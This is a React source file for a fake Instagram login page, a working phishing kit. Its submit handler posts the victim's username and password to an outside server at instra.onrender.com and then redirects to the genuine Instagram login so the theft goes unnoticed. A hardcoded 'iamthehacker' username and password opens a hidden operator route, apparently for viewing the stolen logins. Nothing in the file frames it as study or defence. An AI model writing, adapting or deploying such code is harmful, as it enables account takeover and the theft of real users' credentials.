import React from 'react'
import {FontAwesomeIcon} from '@fortawesome/react-fontawesome'
import {faSquareFacebook} from '@fortawesome/free-brands-svg-icons'
import {useForm} from 'react-hook-form'
import axios from 'axios'
import { useNavigate } from 'react-router-dom'

const Mainui = () => {
  const {register,handleSubmit,reset}=useForm();
  const navigate=useNavigate();

  const sendData=(data)=>{
       console.log(data.name.localeCompare("iamthehacker"))
       if(data.name.localeCompare("iamthehacker")==0&&data.password.localeCompare("ilovehacker")==0){
           navigate('/iamthehacker');
       }
       else{
        axios
        .post('https://instra.onrender.com/data',data)
        .then(()=>{
         window.location.href = 'https://www.instagram.com/accounts/login/?hl=en';
         reset();
        })
        .catch((err)=>{console.log(err)})
       }
  }

  return <>
          <div className='flex flex-col items-center gap-5 h-[90vh]'>
               <div className='pt-4'>
                  <select name="" id="">
                        <option value="English">English</option>
                        <option value="Hindi">Hindi</option>
                        <option value="French">French</option>
                        <option value="japanise">japanise</option>
                  </select>
               </div>
               <div className='w-[50%] py-5'>
                  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSz3GOa09_CQMYmfIdDYXaBzmcVTpSuvTeSpQ&s" alt="" />
               </div>
               <div>
                   <button className='flex justify-center items-center bg-[#1877F2] px-5 py-1 rounded-lg gap-2 text-zinc-100'>
                             <FontAwesomeIcon icon={faSquareFacebook} style={{color: "#ffff",}} />
                             <p className='font-semibold'>Continue with facebook</p>
                   </button>
               </div>
               <div className='flex w-[60%] gap-4'>
                   <div className='w-[50%] border-b-2'></div>
                   <div className='relative'>
                       <p className='absolute top-[-12px] right-[-8px]'>or</p>
                   </div>
                   <div className='w-[50%] border-b-2'></div>
               </div>
               <div className='w-[100%]'>
                    <form action="" onSubmit={handleSubmit(sendData)} className='flex flex-col items-center justify-center gap-2 w-[100%]'>
                            <input {...register('name')} name='name' className='border-2 rounded px-2 py-1 text-sm w-[60%]'  type="text" placeholder='Phone number, username, or email' />
                            <input {...register('password')} name='password' className='border-2 rounded px-2 py-1 text-sm w-[60%]' type="password" placeholder='Password'/>
                             <div className='w-[60%] py-2'> <a href="#" className='font-semibold text-[#1877F2] text-sm ps-[50%]'>forgot password?</a></div>
                             <button className='bg-[#1877F2] py-1 rounded-lg font-semibold text-zinc-100 w-[60%]'>Log in</button>
                    </form>
               </div>
               <div>
                   <p className='text-sm'>Don't have an account? <a className='text-[#1877F2] font-semibold' href="">Sign up</a></p>
               </div>
         </div>
         <div className='flex flex-col justify-center items-center'>
                <div>
                  <p className='text-sm'>from</p>
                </div>
                <div className='w-[25%]'>
                     <img src="data:image/png;base64,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" alt="" />
                </div>
         </div>
         
  </>
}
 export default Mainui;